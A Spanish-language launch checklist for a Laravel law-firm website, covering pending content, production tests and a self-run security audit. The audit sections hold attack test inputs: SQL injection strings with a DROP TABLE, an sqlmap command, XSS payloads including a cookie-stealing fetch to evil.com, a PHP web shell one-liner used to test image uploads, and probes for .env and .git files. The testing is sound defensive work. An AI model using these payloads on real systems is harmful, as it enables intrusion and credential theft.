# Pendientes, pruebas de producción y auditoría de seguridad

---

## 1. Contenido pendiente

Lo único que falta antes de lanzar el sitio son datos reales. El código está completo.

| Tarea | Archivo / Sección | Prioridad |
|---|---|---|
| Foto de Nicool Armas | `public/images/` → reemplazar placeholder en `#nosotros` de `welcome.blade.php` | Alta |
| Testimonios reales | Sección `#testimonios` en `welcome.blade.php` — 3 bloques con nombre, cargo y texto | Alta |
| Correo SMTP real | Variables `MAIL_*` en `.env` de producción | Alta |
| Descripción "Quiénes somos" | Texto en `#nosotros` — revisar si el copy actual es definitivo | Media |
| Migración de imágenes a Cloudflare R2 | Configurar `FILESYSTEM_DISK=r2` y credenciales en `.env` | Media |
| Extensión de tablas en TipTap | Agregar `@tiptap/extension-table` en `editor.js` | Baja |

---

## 2. Pruebas de producción

Ejecutar esta checklist después de cada despliegue, antes de compartir la URL.

### 2.1 Verificación de entorno

```bash
# Confirmar que APP_DEBUG está desactivado
curl -s https://arsayasociados.cl/ruta-que-no-existe | grep -i "debug\|trace\|exception"
# No debe devolver nada. Si devuelve un stack trace, APP_DEBUG está en true.

# Verificar que el sitemap está accesible
curl -s https://arsayasociados.cl/sitemap.xml | head -5

# Verificar robots.txt
curl -s https://arsayasociados.cl/robots.txt
```

### 2.2 Flujo del sitio público

- [ ] `/` — la homepage carga con todas las secciones visibles
- [ ] Los links de navegación (`#servicios`, `#nosotros`, etc.) llevan al ancla correcta
- [ ] `/blog` — el listado muestra artículos publicados, no borradores ni programados futuros
- [ ] `/blog/{slug}` — la vista de artículo individual carga con imagen destacada y contenido formateado
- [ ] Búsqueda en blog — filtra correctamente por texto
- [ ] Filtro de categoría en blog — muestra solo artículos de esa categoría
- [ ] Formulario de contacto — envía el correo y muestra mensaje de confirmación
- [ ] Formulario de contacto — el mensaje queda guardado en la BD (verificar en `/admin/mensajes`)
- [ ] `/politica-de-privacidad` y `/terminos-de-uso` — cargan sin error
- [ ] `/sitemap.xml` — XML válido con las URLs del blog

### 2.3 Panel de administración

- [ ] `/admin` — muestra el formulario de login
- [ ] Login con contraseña incorrecta — muestra error sin revelar información
- [ ] Login con contraseña correcta — redirige al listado de posts
- [ ] Crear artículo — guardar como borrador, verificar que no aparece en `/blog`
- [ ] Publicar artículo — verificar que aparece en `/blog` y en `/sitemap.xml`
- [ ] Publicación programada — setear fecha futura, verificar que no aparece en `/blog` hasta esa fecha
- [ ] Vista previa de borrador — `/admin/posts/{id}/preview` carga correctamente
- [ ] Subida de imagen destacada — la imagen aparece en el artículo del blog
- [ ] Subida de imagen inline (TipTap) — la imagen se inserta en el editor
- [ ] Eliminar imagen destacada — el artículo queda sin imagen, sin error 500
- [ ] Exportar CSV — descarga el archivo con todos los artículos
- [ ] Editar slug — el slug personalizado se guarda y la URL del artículo cambia
- [ ] Slug duplicado — el sistema genera un sufijo único automáticamente (ej. `-2`)
- [ ] Mensajes de contacto — aparecen con estado no leído; marcarlos como leídos funciona

### 2.4 Correo electrónico

- [ ] Enviar el formulario de contacto y verificar que llega el email a la bandeja configurada
- [ ] El remitente muestra el nombre y email correcto (`MAIL_FROM_ADDRESS`)
- [ ] El asunto y cuerpo del email contienen los datos del formulario

### 2.5 SEO

Usar [validator.schema.org](https://validator.schema.org) y [developers.google.com/search/tools/rich-results-test](https://search.google.com/test/rich-results):

- [ ] JSON-LD de `LegalService` válido en la homepage
- [ ] JSON-LD de `BlogPosting` válido en cada artículo
- [ ] `<title>` y `<meta name="description">` únicos por página
- [ ] Open Graph funciona — pegar URL en [opengraph.xyz](https://www.opengraph.xyz) y verificar preview
- [ ] Sitemap indexado — enviar `/sitemap.xml` en Google Search Console

### 2.6 Rendimiento

```bash
# Verificar que los assets están comprimidos (Content-Encoding: gzip/br)
curl -sI -H "Accept-Encoding: gzip, br" https://arsayasociados.cl | grep -i "content-encoding"

# PageSpeed Insights desde CLI (requiere API key de Google)
# O usar https://pagespeed.web.dev directamente
```

- [ ] Imágenes en formato WebP o comprimidas (evitar PNGs grandes)
- [ ] Score de PageSpeed Mobile > 80
- [ ] Score de PageSpeed Desktop > 90

### 2.7 Responsividad y navegadores

Probar en:
- [ ] Chrome / Edge (desktop)
- [ ] Safari (desktop)
- [ ] Chrome en Android
- [ ] Safari en iOS
- [ ] Viewport 375px (iPhone SE) — sin scroll horizontal

---

## 3. Auditoría de vulnerabilidades

### 3.1 Herramientas recomendadas (gratuitas)

| Herramienta | Qué analiza | Instalación |
|---|---|---|
| **OWASP ZAP** | Escaneo automático de vulnerabilidades web | [zaproxy.org](https://www.zaproxy.org) |
| **Nikto** | Configuraciones inseguras del servidor | `sudo apt install nikto` |
| **sqlmap** | Inyección SQL | `sudo apt install sqlmap` |
| **curl** | Headers HTTP manuales | Ya instalado |
| **Mozilla Observatory** | Headers de seguridad HTTP | [observatory.mozilla.org](https://observatory.mozilla.org) |

---

### 3.2 Headers HTTP de seguridad

```bash
curl -sI https://arsayasociados.cl | grep -iE "x-frame|x-content|strict-transport|content-security|referrer"
```

Headers que deben estar presentes en producción:

| Header | Valor recomendado |
|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` |
| `X-Frame-Options` | `SAMEORIGIN` |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |

Agregar en `app/Http/Middleware/` o en el servidor Nginx/Caddy si no aparecen.

---

### 3.3 Pruebas de inyección SQL

El proyecto usa Eloquent ORM, que previene SQL injection nativamente. Verificar de todas formas en parámetros de entrada:

```bash
# Probar el parámetro de búsqueda del blog
curl "https://arsayasociados.cl/blog?search=1' OR '1'='1"
curl "https://arsayasociados.cl/blog?search=1; DROP TABLE posts--"

# El sitio debe devolver resultados vacíos o normales, nunca un error 500 con query SQL expuesto
```

Con sqlmap (solo contra tu propio servidor):
```bash
sqlmap -u "https://arsayasociados.cl/blog?search=test" --batch --level=2
```

---

### 3.4 Pruebas de XSS (Cross-Site Scripting)

```bash
# Intentar inyectar script en búsqueda del blog
curl "https://arsayasociados.cl/blog?search=<script>alert(1)</script>"

# El HTML devuelto debe mostrar el texto escapado, nunca ejecutar el script
# Buscar en la respuesta: &lt;script&gt; (correcto) vs <script> (vulnerable)
curl "https://arsayasociados.cl/blog?search=<script>alert(1)</script>" | grep -i "script"
```

En el formulario de contacto, probar con nombre y mensaje:
```
Nombre: <img src=x onerror=alert(1)>
Mensaje: <script>fetch('https://evil.com?c='+document.cookie)</script>
```
El contenido debe aparecer escapado en `/admin/mensajes`.

---

### 3.5 Pruebas de CSRF

Todos los formularios usan `@csrf`. Verificar que una petición sin token es rechazada:

```bash
# Enviar formulario de contacto sin token CSRF — debe devolver 419
curl -X POST https://arsayasociados.cl/contacto \
  -d "name=test&email=test@test.com&message=hola" \
  -H "Content-Type: application/x-www-form-urlencoded"
# Respuesta esperada: HTTP 419 Page Expired
```

---

### 3.6 Pruebas de autenticación del admin

**Fuerza bruta — verificar rate limiting:**
```bash
# 6 intentos seguidos deben bloquear la IP por 60 segundos
for i in {1..6}; do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://arsayasociados.cl/admin \
    -d "password=incorrecta" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -c cookies.txt -b cookies.txt
  sleep 1
done
# Los primeros 5 deben devolver 302/200 con error. El 6° debe devolver 429.
```

**Acceso directo sin sesión:**
```bash
# Intentar acceder al panel sin autenticar
curl -sI https://arsayasociados.cl/admin/posts
# Debe redirigir a /admin (login), nunca mostrar contenido
```

**Fijación de sesión:**
```bash
# Verificar que la cookie de sesión cambia después del login
curl -sI -X POST https://arsayasociados.cl/admin \
  -d "password=contraseña-correcta" \
  -c cookies_antes.txt
# El Set-Cookie del login debe tener un ID de sesión diferente al de antes de autenticar
```

---

### 3.7 Prueba de subida de archivos

El admin puede subir imágenes. Verificar que solo acepta imágenes:

```bash
# Intentar subir un PHP disfrazado de imagen (requiere estar autenticado)
# Crear archivo de prueba
echo '<?php system($_GET["cmd"]); ?>' > test.php

# Subir con curl al endpoint de imágenes del admin (con cookie de sesión válida)
curl -s -X POST https://arsayasociados.cl/admin/upload-image \
  -F "image=@test.php;type=image/jpeg" \
  -b "cookies válidas del admin"

# Debe devolver error de validación, nunca guardar el archivo
```

---

### 3.8 Exposición de información

```bash
# Verificar que no hay archivos sensibles accesibles
curl -sI https://arsayasociados.cl/.env          # debe devolver 403 o 404
curl -sI https://arsayasociados.cl/.git/config   # debe devolver 403 o 404
curl -sI https://arsayasociados.cl/storage/logs/laravel.log  # debe devolver 403 o 404

# Verificar que phpinfo no está expuesto
curl -s https://arsayasociados.cl/phpinfo.php | grep -i "phpinfo"
# No debe devolver nada
```

Escaneo general con Nikto:
```bash
nikto -h https://arsayasociados.cl
```

---

### 3.9 Escaneo automático con OWASP ZAP

1. Descargar e instalar OWASP ZAP desde [zaproxy.org](https://www.zaproxy.org)
2. Iniciar en modo **Automated Scan**
3. Ingresar la URL del sitio
4. Ejecutar el escaneo completo
5. Revisar el reporte de alertas clasificadas por riesgo (High / Medium / Low)

Para el panel admin, usar ZAP en modo **Spider + Active Scan** con la cookie de sesión del admin inyectada manualmente en las opciones de autenticación de ZAP.

---

### 3.10 Checklist final de seguridad

- [ ] `APP_DEBUG=false` en producción
- [ ] `APP_ENV=production`
- [ ] `SESSION_ENCRYPT=true`
- [ ] `SESSION_SECURE_COOKIE=true`
- [ ] `ADMIN_PASSWORD` tiene mínimo 20 caracteres aleatorios
- [ ] `.env` no es accesible públicamente
- [ ] `.git/` no es accesible públicamente
- [ ] Headers de seguridad HTTP presentes
- [ ] HTTPS activo con certificado válido
- [ ] Sin errores 500 en rutas públicas
- [ ] Sin stack traces visibles en el frontend
- [ ] Rate limiting activo en `/contacto` y `/admin`
- [ ] Subida de archivos rechaza extensiones no permitidas
- [ ] Formularios devuelven 419 sin token CSRF

---

## Referencias

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Laravel Security Checklist](https://laravel.com/docs/security)
- [Mozilla Observatory](https://observatory.mozilla.org)
- [Security Headers](https://securityheaders.com)
- [docs/seguridad.md](./seguridad.md) — modelo de autenticación y protecciones activas del proyecto
- [docs/deploy-railway.md](./deploy-railway.md) — variables de entorno de producción
